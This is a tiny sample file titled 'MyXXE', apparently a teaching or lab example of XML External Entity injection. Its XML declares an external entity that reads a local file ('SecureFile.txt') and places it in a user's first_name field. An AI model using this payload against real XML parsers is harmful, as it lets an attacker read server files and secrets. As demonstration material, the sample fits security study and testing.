# MyXXE

<?xml version="1.0"?>
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///...SecureFile.txt">
]>
<user>
    <first_name>&xxe;</first_name>
    <last_name>Belson</last_name>
</user>
